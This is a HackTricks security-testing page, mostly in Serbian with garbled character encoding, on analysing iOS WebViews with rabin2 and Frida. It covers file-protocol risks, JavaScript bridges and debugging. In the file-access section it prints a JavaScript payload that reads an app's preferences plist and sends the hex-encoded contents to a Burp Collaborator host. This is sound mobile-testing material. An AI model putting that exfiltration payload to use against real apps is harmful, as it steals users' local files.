# iOS WebViews

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

The code of this page was extracted from [here](https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md). Check the page for further details.


## WebViews types

WebViews se koriste unutar aplikacija za interaktivno prikazivanje web sadrÅ¾aja. RazliÄite vrste WebViews nude razliÄite funkcionalnosti i bezbednosne karakteristike za iOS aplikacije. Evo kratkog pregleda:

- **UIWebView**, koji viÅ¡e nije preporuÄen od iOS 12 nadalje zbog nedostatka podrÅ¡ke za onemoguÄ‡avanje **JavaScript**, Å¡to ga Äini podloÅ¾nim injekciji skripti i **Cross-Site Scripting (XSS)** napadima.

- **WKWebView** je preferisana opcija za ukljuÄivanje web sadrÅ¾aja u aplikacije, nudeÄ‡i poboljÅ¡anu kontrolu nad sadrÅ¾ajem i bezbednosnim karakteristikama. **JavaScript** je podrazumevano omoguÄ‡en, ali se moÅ¾e onemoguÄ‡iti ako je potrebno. TakoÄ‘e podrÅ¾ava funkcije za spreÄavanje automatskog otvaranja prozora od strane JavaScript-a i osigurava da se sav sadrÅ¾aj uÄitava sigurno. Pored toga, arhitektura **WKWebView** minimizira rizik od oÅ¡teÄ‡enja memorije koje utiÄe na glavni proces aplikacije.

- **SFSafariViewController** nudi standardizovano iskustvo web pretraÅ¾ivanja unutar aplikacija, prepoznatljivo po svom specifiÄnom rasporedu koji ukljuÄuje polje za adresu samo za Äitanje, dugmad za deljenje i navigaciju, i direktnu vezu za otvaranje sadrÅ¾aja u Safariju. Za razliku od **WKWebView**, **JavaScript** se ne moÅ¾e onemoguÄ‡iti u **SFSafariViewController**, koji takoÄ‘e deli kolaÄiÄ‡e i podatke sa Safarijem, odrÅ¾avajuÄ‡i privatnost korisnika od aplikacije. Mora biti istaknuto u skladu sa smernicama App Store-a.
```javascript
// Example of disabling JavaScript in WKWebView:
WKPreferences *preferences = [[WKPreferences alloc] init];
preferences.javaScriptEnabled = NO;
WKWebViewConfiguration *config = [[WKWebViewConfiguration alloc] init];
config.preferences = preferences;
WKWebView *webView = [[WKWebView alloc] initWithFrame:CGRectZero configuration:config];
```
## WebViews Configuration Exploration Summary

### **Static Analysis Overview**

U procesu ispitivanja **WebViews** konfiguracija, fokusira se na dva glavna tipa: **UIWebView** i **WKWebView**. Za identifikaciju ovih WebViews unutar binarnog fajla, koriste se komande koje pretraÅ¾uju specifiÄne reference klasa i metode inicijalizacije.

- **UIWebView Identification**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "UIWebView$"
```
Ova komanda pomaÅ¾e u lociranju instanci **UIWebView** pretraÅ¾ujuÄ‡i tekstualne nizove povezane s njom u binarnom kodu.

- **WKWebView Identifikacija**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "WKWebView$"
```
SliÄno tome, za **WKWebView**, ova komanda pretraÅ¾uje binarni fajl za tekstualne stringove koji ukazuju na njegovu upotrebu.

Pored toga, da bi se saznalo kako se **WKWebView** inicijalizuje, izvrÅ¡ava se sledeÄ‡a komanda, koja cilja na potpis metode vezane za njegovu inicijalizaciju:
```bash
$ rabin2 -zzq ./WheresMyBrowser | egrep "WKWebView.*frame"
```
#### **Provera Konfiguracije JavaScript-a**

Za **WKWebView**, naglaÅ¡ava se da je onemoguÄ‡avanje JavaScript-a najbolja praksa osim ako nije potrebno. PretraÅ¾uje se kompajlirani binarni fajl kako bi se potvrdilo da je svojstvo `javaScriptEnabled` postavljeno na `false`, Äime se osigurava da je JavaScript onemoguÄ‡en:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "javascriptenabled"
```
#### **Samo verifikacija sigurnog sadrÅ¾aja**

**WKWebView** nudi moguÄ‡nost identifikacije problema sa meÅ¡anim sadrÅ¾ajem, u suprotnosti sa **UIWebView**. Ovo se proverava koriÅ¡Ä‡enjem `hasOnlySecureContent` svojstva kako bi se osiguralo da su svi resursi stranice uÄitani putem sigurnih veza. Pretraga u kompajliranom binarnom fajlu se vrÅ¡i na sledeÄ‡i naÄin:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "hasonlysecurecontent"
```
### **Uvidi u DinamiÄku Analizu**

DinamiÄka analiza ukljuÄuje inspekciju heap-a za WebView instance i njihove osobine. Skripta pod nazivom `webviews_inspector.js` se koristi u tu svrhu, ciljajuÄ‡i `UIWebView`, `WKWebView` i `SFSafariViewController` instance. BeleÅ¾i informacije o pronaÄ‘enim instancama, ukljuÄujuÄ‡i URL-ove i podeÅ¡avanja vezana za JavaScript i sigurni sadrÅ¾aj.

Inspekcija heap-a moÅ¾e se izvrÅ¡iti koriÅ¡Ä‡enjem `ObjC.choose()` za identifikaciju WebView instanci i proveru `javaScriptEnabled` i `hasonlysecurecontent` osobina.

{% code title="webviews_inspector.js" %}
```javascript
ObjC.choose(ObjC.classes['UIWebView'], {
onMatch: function (ui) {
console.log('onMatch: ', ui);
console.log('URL: ', ui.request().toString());
},
onComplete: function () {
console.log('done for UIWebView!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});

ObjC.choose(ObjC.classes['SFSafariViewController'], {
onMatch: function (sf) {
console.log('onMatch: ', sf);
},
onComplete: function () {
console.log('done for SFSafariViewController!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('javaScriptEnabled:', wk.configuration().preferences().javaScriptEnabled());
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
}
});
```
{% endcode %}

Ğ¡ĞºÑ€Ğ¸Ğ¿Ñ‚ ÑĞµ Ğ¸Ğ·Ğ²Ñ€ÑˆĞ°Ğ²Ğ° ÑĞ°:
```bash
frida -U com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js
```
**KljuÄni Ishodi**:
- Primeri WebView-a su uspeÅ¡no locirani i pregledani.
- OmoguÄ‡avanje JavaScript-a i podeÅ¡avanja sigurnog sadrÅ¾aja su verifikovani.

Ova saÅ¾etak obuhvata kljuÄne korake i komande ukljuÄene u analizu WebView konfiguracija kroz statiÄke i dinamiÄke pristupe, fokusirajuÄ‡i se na bezbednosne karakteristike kao Å¡to su omoguÄ‡avanje JavaScript-a i detekcija meÅ¡anog sadrÅ¾aja.

## Rukovanje WebView Protokolima

Rukovanje sadrÅ¾ajem u WebView-ima je kritiÄan aspekt, posebno kada se radi o razliÄitim protokolima kao Å¡to su `http(s)://`, `file://`, i `tel://`. Ovi protokoli omoguÄ‡avaju uÄitavanje kako udaljenog, tako i lokalnog sadrÅ¾aja unutar aplikacija. NaglaÅ¡ava se da prilikom uÄitavanja lokalnog sadrÅ¾aja, treba preduzeti mere opreza kako bi se spreÄilo da korisnici utiÄu na ime ili putanju datoteke i da ureÄ‘uju sam sadrÅ¾aj.

**WebViews** nude razliÄite metode za uÄitavanje sadrÅ¾aja. Za **UIWebView**, koji je sada zastareo, koriste se metode kao Å¡to su `loadHTMLString:baseURL:` i `loadData:MIMEType:textEncodingName:baseURL:`. **WKWebView**, s druge strane, koristi `loadHTMLString:baseURL:`, `loadData:MIMEType:textEncodingName:baseURL:`, i `loadRequest:` za web sadrÅ¾aj. Metode kao Å¡to su `pathForResource:ofType:`, `URLForResource:withExtension:`, i `init(contentsOf:encoding:)` se obiÄno koriste za uÄitavanje lokalnih datoteka. Metoda `loadFileURL:allowingReadAccessToURL:` je posebno znaÄajna zbog svoje sposobnosti da uÄita odreÄ‘eni URL ili direktorijum u WebView, potencijalno izlaÅ¾uÄ‡i osetljive podatke ako je specificiran direktorijum.

Da bi se pronaÅ¡le ove metode u izvor kodu ili kompajliranom binarnom fajlu, mogu se koristiti komande kao Å¡to su:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "loadHTMLString"
231 0x0002df6c 24 (4.__TEXT.__objc_methname) ascii loadHTMLString:baseURL:
```
Regarding **file access**, UIWebView omoguÄ‡ava univerzalni pristup, dok WKWebView uvodi `allowFileAccessFromFileURLs` i `allowUniversalAccessFromFileURLs` podeÅ¡avanja za upravljanje pristupom sa URL-ova datoteka, pri Äemu su oba podrazumevano postavljena na false.

Primer Frida skripte je dat za inspekciju **WKWebView** konfiguracija za bezbednosna podeÅ¡avanja:
```bash
ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
console.log('javaScriptEnabled: ', wk.configuration().preferences().javaScriptEnabled());
console.log('allowFileAccessFromFileURLs: ',
wk.configuration().preferences().valueForKey_('allowFileAccessFromFileURLs').toString());
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
console.log('allowUniversalAccessFromFileURLs: ',
wk.configuration().valueForKey_('allowUniversalAccessFromFileURLs').toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});
```
Lastly, an example of a JavaScript payload aimed at exfiltrating local files demonstrates the potential security risk associated with improperly configured WebViews. Ovaj payload kodira sadrÅ¾aj datoteka u heksadecimalni format pre nego Å¡to ih prenese na server, istiÄuÄ‡i vaÅ¾nost strogih bezbednosnih mera u implementacijama WebView.
```javascript
String.prototype.hexEncode = function(){
var hex, i;
var result = "";
for (i=0; i<this.length; i++) {
hex = this.charCodeAt(i).toString(16);
result += ("000"+hex).slice(-4);
}
return result
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
var xhr2 = new XMLHttpRequest();
xhr2.open('GET', 'http://187e2gd0zxunzmb5vlowsz4j1a70vp.burpcollaborator.net/'+xhr.responseText.hexEncode(), true);
xhr2.send(null);
}
}
xhr.open('GET', 'file:///var/mobile/Containers/Data/Application/ED4E0AD8-F7F7-4078-93CC-C350465048A5/Library/Preferences/com.authenticationfailure.WheresMyBrowser.plist', true);
xhr.send(null);
```
## Native Methods Exposed Through WebViews

## Razumevanje WebView Native Interfaces u iOS-u

Od iOS 7 pa nadalje, Apple je obezbedio API-je za **komunikaciju izmeÄ‘u JavaScript-a u WebView-u i native** Swift ili Objective-C objekata. Ova integracija se prvenstveno olakÅ¡ava kroz dve metode:

- **JSContext**: JavaScript funkcija se automatski kreira kada je Swift ili Objective-C blok povezan sa identifikatorom unutar `JSContext`. Ovo omoguÄ‡ava besprekornu integraciju i komunikaciju izmeÄ‘u JavaScript-a i native koda.
- **JSExport Protocol**: NasleÄ‘ivanjem `JSExport` protokola, native svojstva, instance metode i metode klase mogu biti izloÅ¾ene JavaScript-u. To znaÄi da su sve promene napravljene u JavaScript okruÅ¾enju odraÅ¾ene u native okruÅ¾enju, i obrnuto. MeÄ‘utim, vaÅ¾no je osigurati da osetljivi podaci nisu nenamerno izloÅ¾eni ovom metodom.

### Pristupanje `JSContext` u Objective-C

U Objective-C, `JSContext` za `UIWebView` moÅ¾e se dobiti sledeÄ‡om linijom koda:
```objc
[webView valueForKeyPath:@"documentView.webView.mainFrame.javaScriptContext"]
```
### Communication with `WKWebView`

Za `WKWebView`, direktan pristup `JSContext` nije dostupan. Umesto toga, koristi se prenos poruka putem funkcije `postMessage`, omoguÄ‡avajuÄ‡i komunikaciju izmeÄ‘u JavaScripta i nativne aplikacije. Handleri za ove poruke se postavljaju na sledeÄ‡i naÄin, omoguÄ‡avajuÄ‡i JavaScriptu da sigurno komunicira sa nativnom aplikacijom:
```swift
func enableJavaScriptBridge(_ enabled: Bool) {
options_dict["javaScriptBridge"]?.value = enabled
let userContentController = wkWebViewConfiguration.userContentController
userContentController.removeScriptMessageHandler(forName: "javaScriptBridge")

if enabled {
let javaScriptBridgeMessageHandler = JavaScriptBridgeMessageHandler()
userContentController.add(javaScriptBridgeMessageHandler, name: "javaScriptBridge")
}
}
```
### Interaction and Testing

JavaScript moÅ¾e da komunicira sa nativnim slojem definisanjem rukovaoca porukama skripte. Ovo omoguÄ‡ava operacije kao Å¡to su pozivanje nativnih funkcija sa veb stranice:
```javascript
function invokeNativeOperation() {
value1 = document.getElementById("value1").value
value2 = document.getElementById("value2").value
window.webkit.messageHandlers.javaScriptBridge.postMessage(["multiplyNumbers", value1, value2]);
}

// Alternative method for calling exposed JavaScript functions
document.location = "javascriptbridge://addNumbers/" + 1 + "/" + 2
```
Da bi se uhvatio i manipulisao rezultat poziva native funkcije, moÅ¾e se prepisati callback funkcija unutar HTML-a:
```html
<html>
<script>
document.location = "javascriptbridge://getSecret"
function javascriptBridgeCallBack(name, result) {
alert(result);
}
</script>
</html>
```
Nativna strana obraÄ‘uje JavaScript poziv kao Å¡to je prikazano u `JavaScriptBridgeMessageHandler` klasi, gde se rezultat operacija kao Å¡to je mnoÅ¾enje brojeva obraÄ‘uje i Å¡alje nazad JavaScript-u za prikaz ili dalju manipulaciju:
```swift
class JavaScriptBridgeMessageHandler: NSObject, WKScriptMessageHandler {
// Handling "multiplyNumbers" operation
case "multiplyNumbers":
let arg1 = Double(messageArray[1])!
let arg2 = Double(messageArray[2])!
result = String(arg1 * arg2)
// Callback to JavaScript
let javaScriptCallBack = "javascriptBridgeCallBack('\(functionFromJS)','\(result)')"
message.webView?.evaluateJavaScript(javaScriptCallBack, completionHandler: nil)
}
```
## Debugging iOS WebViews

(Tutorial zasnovan na onom sa [https://blog.vuplex.com/debugging-webviews](https://blog.vuplex.com/debugging-webviews))

Da biste efikasno debagovali web sadrÅ¾aj unutar iOS webview-a, potrebna je specifiÄna postavka koja ukljuÄuje Safari-ove alate za programere zbog toga Å¡to poruke poslate na `console.log()` nisu prikazane u Xcode logovima. Evo pojednostavljenog vodiÄa, sa naglaskom na kljuÄne korake i zahteve:

- **Priprema na iOS ureÄ‘aju**: Safari Web Inspector treba aktivirati na vaÅ¡em iOS ureÄ‘aju. To se radi odlaskom na **PodeÅ¡avanja > Safari > Napredno**, i omoguÄ‡avanjem _Web Inspector_.

- **Priprema na macOS ureÄ‘aju**: Na vaÅ¡em macOS razvojnim raÄunaru, morate omoguÄ‡iti alate za programere unutar Safarija. Pokrenite Safari, pristupite **Safari > Preferencije > Napredno**, i izaberite opciju _PrikaÅ¾i Develop meni_.

- **Povezivanje i debagovanje**: Nakon Å¡to poveÅ¾ete svoj iOS ureÄ‘aj sa vaÅ¡im macOS raÄunarom i pokrenete vaÅ¡u aplikaciju, koristite Safari na vaÅ¡em macOS ureÄ‘aju da izaberete webview koji Å¾elite da debagujete. Idite na _Develop_ u meniju Safarija, preÄ‘ite miÅ¡em preko imena vaÅ¡eg iOS ureÄ‘aja da biste videli listu instanci webview-a, i izaberite instancu koju Å¾elite da pregledate. OtvoriÄ‡e se novi prozor Safari Web Inspector-a u tu svrhu.

MeÄ‘utim, imajte na umu ograniÄenja:

- Debagovanje ovom metodom zahteva macOS ureÄ‘aj jer se oslanja na Safari.
- Samo webview-i u aplikacijama uÄitanim na vaÅ¡ ureÄ‘aj putem Xcode-a su podobni za debagovanje. Webview-i u aplikacijama instaliranim putem App Store-a ili Apple Configurator-a ne mogu se debagovati na ovaj naÄin.


## References

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6)
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)
* [https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md](https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
